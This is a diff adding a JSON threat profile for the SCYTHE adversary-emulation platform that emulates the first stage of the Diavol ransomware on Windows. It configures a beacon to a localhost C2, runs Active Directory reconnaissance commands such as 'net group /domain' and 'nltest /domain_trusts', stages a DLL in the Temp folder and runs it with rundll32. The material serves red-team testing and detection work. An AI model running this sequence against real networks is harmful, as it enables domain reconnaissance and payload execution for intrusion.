@@ -1,0 +1,117 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "https://github.com/scythe-io/community-threats/tree/master/Diavol",
+        "display_name": "DiavolStage1",
+        "name": "DiavolStage1",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":5,\"--jitter\":10}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "time": "900",
+                "type": "delay"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net group /domain",
+                "rtags": [
+                    "att&ck-technique:T1087.002"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net group /domain \"Domain Admins\"",
+                "rtags": [
+                    "att&ck-technique:T1087.002"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net group \"Domain Computers\" /domain",
+                "rtags": [
+                    "att&ck-technique:T1069.002"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net localgroup administrators",
+                "rtags": [
+                    "att&ck-technique:T1069.001"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net view /all",
+                "rtags": [
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "nltest /domain_trusts /all_trusts",
+                "rtags": [
+                    "att&ck-technique:T1482"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "time": "6000",
+                "type": "delay"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Diavol/tfpkuengdlu.dll\" --dest \"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\"",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "rundll32.exe \"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\",EnterDll",
+                "rtags": [
+                    "att&ck-technique:T1218.011"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
